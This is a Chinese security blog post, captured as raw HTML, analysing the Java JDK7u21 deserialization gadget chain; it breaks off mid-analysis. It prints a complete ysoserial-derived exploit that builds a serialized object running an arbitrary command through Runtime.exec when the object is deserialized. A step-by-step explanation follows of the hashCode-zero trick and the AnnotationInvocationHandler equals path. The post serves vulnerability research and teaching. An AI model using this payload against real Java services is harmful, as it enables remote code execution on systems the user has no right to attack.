@@ -1,0 +1,771 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Java 反序列化漏洞始末（2）— JDK - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="Jdk7u21jdk7u21 gadget 可以算的上是非常骚的一个反序列化 payload，浑身都是骚点。相比 Apache commons collections 系列的 payload 分..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Java 反序列化漏洞始末（2）— JDK &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/176.html" />
+<link rel="alternate" type="application/rdf+xml" title="Java 反序列化漏洞始末（2）— JDK &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/176.html" />
+<link rel="alternate" type="application/atom+xml" title="Java 反序列化漏洞始末（2）— JDK &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/176.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-176'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-176'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-176'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _n1RY = //'e'
+'4'+//'wka'
+'56'+'ioY'//'ioY'
++'98'//'80s'
++'29'//'ip'
++/* 'II3'//'II3' */''+//'J'
+'7e'+'0'//'a'
++//'5'
+'d'+'0'//'vp'
++'85'//'ed0'
++//'dfD'
+'ea'+'d4'//'Jcq'
++'7'//'xD'
++//'L4'
+'b5'+//'z'
+'940'+//'OS'
+'135'+//'1r'
+'1r'+//'ybe'
+'1df'+//'i2'
+'0'+//'q'
+'4', _kDB8Pf = [[3,6],[27,29]];
+    
+    for (var i = 0; i < _kDB8Pf.length; i ++) {
+        _n1RY = _n1RY.substring(0, _kDB8Pf[i][0]) + _n1RY.substring(_kDB8Pf[i][1]);
+    }
+
+    return _n1RY;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Java 反序列化漏洞始末（2）— JDK</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-06-26 18:23:00" itemprop="datePublished">2019-06-26 18:23:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/176.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/176.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>Jdk7u21</h1><p>jdk7u21 gadget 可以算的上是非常骚的一个反序列化 payload，浑身都是骚点。</p><p>相比 Apache commons collections 系列的 payload 分析起来要稍稍烧脑一点。</p><pre><code>    public static void main(String[] args) throws Exception {
+
+        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(&quot;calc&quot;);
+
+        calc.getOutputProperties();
+    }</code></pre><p>不管序不序列化的，先让他弹个计算器再说。</p><p><img src="/usr/uploads/2019/06/836419730.jpg" alt="1561617491(1).jpg" title="1561617491(1).jpg"></p><p>参考了 gist 和一些大佬的分析文章可以得知，漏洞触发的地方在 TemplatesImpl.getOutputProperties(); 方法。</p><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank">https://gist.github.com/frohoff/24af7913611f8406eaf3</a></p><blockquote><p>/src.zip!/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java:380</p></blockquote><pre><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></pre><p>最终是在这里被触发的，所以现在是要让他在反序列化时自动去调用 getOutputProperties() 。</p><h1>EXP</h1><pre><code>package jdk;
+
+import java.io.*;
+import java.lang.reflect.AccessibleObject;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import sun.reflect.ReflectionFactory;
+import java.lang.reflect.InvocationHandler;
+import java.util.HashMap;
+import java.util.LinkedHashSet;
+
+import javax.xml.transform.Templates;
+
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="aeccc2dbcbeec7d6ddcbcd80c1dcc9">[email&#160;protected]</a>
+ * @since 2019/6/26 17:48
+ */
+
+public class Jdk7u21{
+
+    public static Object getObject(final String command) throws Exception {
+        final Object templates = Gadgets.createTemplatesImpl(command);
+
+        String zeroHashCodeStr = &quot;f5a5a608&quot;;
+
+        HashMap map = new HashMap();
+        map.put(zeroHashCodeStr, &quot;foo&quot;);
+
+        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+        Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);
+        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
+
+        LinkedHashSet set = new LinkedHashSet(); // maintain order
+        set.add(templates);
+        set.add(proxy);
+
+        Reflections.setFieldValue(templates, &quot;_auxClasses&quot;, null);
+        Reflections.setFieldValue(templates, &quot;_class&quot;, null);
+
+        map.put(zeroHashCodeStr, templates); // swap in real object
+
+        return set;
+    }
+
+
+    public static void main(String[] args) throws Exception {
+
+        Object calc = getObject(&quot;calc&quot;);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(calc);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+
+    }
+
+
+
+}
+
+
+ class Reflections {
+
+    public static void setAccessible(AccessibleObject member) {
+        // quiet runtime warnings from JDK9+
+        member.setAccessible(true);
+    }
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            setAccessible(field);
+        }
+        catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        return field.get(obj);
+    }
+
+    public static Constructor&lt;?&gt; getFirstCtor(final String name) throws Exception {
+        final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];
+        setAccessible(ctor);
+        return ctor;
+    }
+
+    public static Object newInstance(String className, Object ... args) throws Exception {
+        return getFirstCtor(className).newInstance(args);
+    }
+
+    public static &lt;T&gt; T createWithoutConstructor ( Class&lt;T&gt; classToInstantiate )
+            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
+    }
+
+    @SuppressWarnings ( {&quot;unchecked&quot;} )
+    public static &lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )
+            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
+        Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);
+        setAccessible(objCons);
+        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
+        setAccessible(sc);
+        return (T)sc.newInstance(consArgs);
+    }
+
+}
+class Gadgets {
+
+    static {
+        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
+        System.setProperty(DESERIALIZE_TRANSLET, &quot;true&quot;);
+
+        // for RMI remote loading
+        System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);
+    }
+
+    public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+
+        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
+
+
+        @Override
+        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+    }
+
+    // required to make TemplatesImpl happy
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
+    }
+
+
+    public static &lt;T&gt; T createMemoitizedProxy ( final Map&lt;String, Object&gt; map, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces ) throws Exception {
+        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
+    }
+
+
+    public static InvocationHandler createMemoizedInvocationHandler ( final Map&lt;String, Object&gt; map ) throws Exception {
+        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+    }
+
+
+    public static &lt;T&gt; T createProxy ( final InvocationHandler ih, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces ) {
+        final Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + 1);
+        allIfaces[ 0 ] = iface;
+        if ( ifaces.length &gt; 0 ) {
+            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+        }
+        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
+    }
+
+
+    public static Map&lt;String, Object&gt; createMap ( final String key, final Object val ) {
+        final Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();
+        map.put(key, val);
+        return map;
+    }
+
+
+    public static Object createTemplatesImpl ( final String command ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) {
+            return createTemplatesImpl(
+                    command,
+                    Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;),
+                    Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;),
+                    Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;));
+        }
+
+        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+
+    public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )
+            throws Exception {
+        final T templates = tplClass.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
+                command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
+                &quot;\&quot;);&quot;;
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
+                classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
+        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
+        return templates;
+    }
+
+
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
+            IllegalAccessException, InvocationTargetException {
+        HashMap s = new HashMap();
+        Reflections.setFieldValue(s, &quot;size&quot;, 2);
+        Class nodeC;
+        try {
+            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);
+        }
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        Reflections.setAccessible(nodeCons);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        Reflections.setFieldValue(s, &quot;table&quot;, tbl);
+        return s;
+    }
+}
+
+ class ClassFiles {
+    public static String classAsFile(final Class&lt;?&gt; clazz) {
+        return classAsFile(clazz, true);
+    }
+
+    public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) {
+        String str;
+        if (clazz.getEnclosingClass() == null) {
+            str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;);
+        } else {
+            str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName();
+        }
+        if (suffix) {
+            str += &quot;.class&quot;;
+        }
+        return str;
+    }
+
+    public static byte[] classAsBytes(final Class&lt;?&gt; clazz) {
+        try {
+            final byte[] buffer = new byte[1024];
+            final String file = classAsFile(clazz);
+            final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
+            if (in == null) {
+                throw new IOException(&quot;couldn't find '&quot; + file + &quot;'&quot;);
+            }
+            final ByteArrayOutputStream out = new ByteArrayOutputStream();
+            int len;
+            while ((len = in.read(buffer)) != -1) {
+                out.write(buffer, 0, len);
+            }
+            return out.toByteArray();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
+}</code></pre><p>我把 ysoserial 里的 payload 生成代码给提取了出来，看看他是如何构造的 payload。</p><h2>如何构造的 payload</h2><p>主要看 <code>createTemplatesImpl</code> 方法。</p><p>其中这一段，是使用 javassist 动态的添加的恶意 java 代码，在初始化后执行。</p><pre><code>String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
+                command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
+                &quot;\&quot;);&quot;;
+
+        clazz.makeClassInitializer().insertAfter(cmd);</code></pre><p>并且设定了类名为 <code>ysoserial.Pwner + System.nanoTime()</code></p><p>最后通过反射把类的字节码塞进了 TemplatesImpl 的 _bytecodes 属性里。</p><p>至此 payload 生成部分结束。</p><pre><code>        String zeroHashCodeStr = &quot;f5a5a608&quot;;</code></pre><p>这个奇怪的字符串暂且不管是干嘛的，值得关注的是它的 hashCode 为 0。</p><p>其实不止这一个字符串 hashCode 为 0。</p><p>经过测试，我发现 空字符串和 <code>\u0000</code> 的 hashCode 都为 0。</p><p>网上也有一些其他例子，在这里都适用，只要是 hashCode 为 0 就行</p><p>参考：<a href="https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero" target="_blank">https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero</a></p><p>后面除了创建了一个动态代理还有，一个装有键 = f5a5a608 值 = TemplatesImpl恶意对象的 HashMap 和装有 TemplatesImpl </p><p>恶意对象和 Templates 动态代理对象的 LinkedHashSet，</p><p>至此得出最终被序列化的恶意对象 LinkedHashSet。</p><h2>复现</h2><pre><code>public static void main(String[] args) throws Exception {
+        Object calc = getObject(&quot;calc&quot;);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(calc);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject();
+
+    }</code></pre><h1>分析</h1><p>LinkedHashSet 继承自 HashSet，readObject 在父类里。</p><p>它会把反序列化回来的对象，添加到 map 里（HashSet 本质上是一个 HashMap）</p><p>添加的顺序是，先添加 templates 再添加 proxy。</p><p>在第二次添加，也就是添加 proxy 的时候，此时 map  里已经有了一个 templates 。</p><p><img src="/usr/uploads/2019/06/3885081730.jpg" alt="1561622252(1).jpg" title="1561622252(1).jpg"></p><p>它会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。</p><pre><code>    public V put(K key, V value) {
+        if (key == null)
+            return putForNullKey(value);
+        int hash = hash(key);
+        int i = indexFor(hash, table.length);
+        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+            Object k;
+            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
+                V oldValue = e.value;
+                e.value = value;
+                e.recordAccess(this);
+                return oldValue;
+            }
+        }
+
+        modCount++;
+        addEntry(hash, key, value, i);
+        return null;
+    }</code></pre><p>而问题正好就出在了 key.equals(k) 这个地方。</p><p>要想执行到这里，必须满足如下条件</p><blockquote><p>e.hash == hash 为真<br>(k = e.key) == key  为假</p></blockquote><p><strong> e.hash </strong> 其实就是 templates 对象经过计算后的 hash 暂且假设为 10086</p><p><strong> hash </strong> 是当前代理对象的 hash，这里要看一下它是怎么计算代理对象的 hash 的</p><p>在 hashMap 计算对象 hash 在当前对象的 hashCode 的基础上做了一些异或运算，所以还是要去调用对象的 hashCode 方法的。</p><p>因为此时的 key 是一个 proxy 代理，要调用它的方法先进 invoke 接口。既（sun.reflect.annotation.AnnotationInvocationHandler#invoke）</p><pre><code> else if (var4.equals(&quot;hashCode&quot;)) {
+                return this.hashCodeImpl();
+            }</code></pre><p>在 invoke 方法中它判断了如果方法名为 hashCode 就去调用 hashCodeImpl() 方法</p><pre><code>private int hashCodeImpl() {
+        int var1 = 0;
+
+        Entry var3;
+        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
+            var3 = (Entry)var2.next();
+        }
+
+        return var1;
+    }</code></pre><p>看起来挺恶心，其实简化一下理解就是，遍历 memberValues 这个 map 对象，然后做这样一个运算</p><pre><code>v += 127 * (键).hashCode() ^ memberValueHashCode(值);</code></pre><p>memberValues 这个对象其实是我在实例化 AnnotationInvocationHandler 对象时传过去的 hashMap。</p><pre><code>//         InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+
+class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+    private static final long serialVersionUID = 6182022883658399397L;
+    private final Class&lt;? extends Annotation&gt; type;
+    private final Map&lt;String, Object&gt; memberValues;
+    private transient volatile Method[] memberMethods = null;
+
+    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        this.type = var1;
+        this.memberValues = var2;
+    }
+//.....
+}</code></pre><p>这个 hashMap 它的键被我设定为了 <code>f5a5a608</code> 值是 templates 对象。</p><p>所以它在这里的 hashCode 运算表达式就变成了</p><blockquote><p>0 ^ memberValueHashCode(templates);</p></blockquote><p>等价于</p><blockquote><p>memberValueHashCode(templates);</p></blockquote><p>又等价于</p><blockquote><p>templates.hashCode()</p></blockquote><pre><code>
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ee8c829b8bae87969d8b8dc0819c89">[email&#160;protected]</a>
+ * @since 2019/6/27 16:12
+ */
+public class HashCode {
+
+
+    public static void main(String[] args) {
+
+        Object expVal = new Object();
+        String expKey = &quot;f5a5a608&quot;;
+        int i = 127 * (expKey).hashCode() ^ memberValueHashCode(expVal);
+
+        System.out.println(i);
+        System.out.println(expVal.hashCode());
+
+
+    }
+
+    private static int memberValueHashCode(Object var0) {
+        Class var1 = var0.getClass();
+        if (!var1.isArray()) {
+            return var0.hashCode();
+        } else if (var1 == byte[].class) {
+            return Arrays.hashCode((byte[])((byte[])var0));
+        } else if (var1 == char[].class) {
+            return Arrays.hashCode((char[])((char[])var0));
+        } else if (var1 == double[].class) {
+            return Arrays.hashCode((double[])((double[])var0));
+        } else if (var1 == float[].class) {
+            return Arrays.hashCode((float[])((float[])var0));
+        } else if (var1 == int[].class) {
+            return Arrays.hashCode((int[])((int[])var0));
+        } else if (var1 == long[].class) {
+            return Arrays.hashCode((long[])((long[])var0));
+        } else if (var1 == short[].class) {
+            return Arrays.hashCode((short[])((short[])var0));
+        } else {
+            return var1 == boolean[].class ? Arrays.hashCode((boolean[])((boolean[])var0)) : Arrays.hashCode((Object[])((Object[])var0));
+        }
+    }
+
+}</code></pre><p>可以拿这个 demo 做个试验，经过测试会发现计算后的 hashCode 和 expVal 对象的 hashCode 是相等的</p><p>其实说白了此时的情况就是拿 templates 对象和自身的 hashCode 做比较，结果当然为 true。</p><p>第二个条件 <strong> (k = e.key) == key  </strong>  想都不用想，拿 proxy 和 templates 比肯定为 false。</p><p>所以程序自然走到了  <code>key.equals(k)</code> 这一步，既 <code>proxy.equals( templates )</code></p><p>那因为调用的是代理对象的方法，自然要再走一遍 invoke 接口。</p><pre><code>if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+            return this.equalsImpl(var3[0]);
+        } </code></pre><p>invoke 接口中又会去调用 equalsImpl 方法。</p><pre><code>private Boolean equalsImpl(Object var1) {
+        if (var1 == this) {
+            return true;
+        } else if (!this.type.isInstance(var1)) {
+            return false;
+        } else {
+            Method[] var2 = this.getMemberMethods(); // 取出无参方法
+            int var3 = var2.length;
+
+            for(int var4 = 0; var4 &lt; var3; ++var4) {
+                Method var5 = var2[var4];
+                String var6 = var5.getName();
+                Object var7 = this.memberValues.get(var6);
+                Object var8 = null;
+                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
+                if (var9 != null) {
+                    var8 = var9.memberValues.get(var6);
+                } else {
+                    try {
+                        var8 = var5.invoke(var1);
+                    } catch (InvocationTargetException var11) {
+                        return false;
+                    } catch (IllegalAccessException var12) {
+                        throw new AssertionError(var12);
+                    }
+                }
+
+                if (!memberValueEquals(var7, var8)) {
+                    return false;
+                }
+            }
+
+            return true;
+        }
+    }</code></pre><p>其中在注释部分取出了 templates 的两个无参方法，并且使用了反射执行。</p><pre><code>    Transformer newTransformer() throws TransformerConfigurationException;
+    Properties getOutputProperties();</code></pre><p>TemplatesImpl 中 getOutputProperties 方法调用过程如下。</p><pre><code># com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
